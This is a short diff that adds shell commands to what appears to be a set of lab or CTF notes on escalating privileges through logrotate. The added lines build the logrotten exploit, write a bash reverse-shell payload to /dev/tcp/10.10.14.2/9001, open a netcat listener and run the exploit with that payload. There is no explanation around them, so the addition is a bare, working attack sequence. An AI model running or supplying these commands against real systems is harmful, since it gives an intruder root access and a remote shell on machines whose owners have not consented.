@@ -253,4 +253,18 @@ logrotate --help
 cat /etc/logrotate.conf
 sudo cat /var/lib/logrotate.status
 ls /etc/logrotate.d/
+
+cat /etc/logrotate.d/dpkg
+
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
+nc -nlvp 9001
+
+./logrotten -p ./payload /tmp/tmp.log
 ```
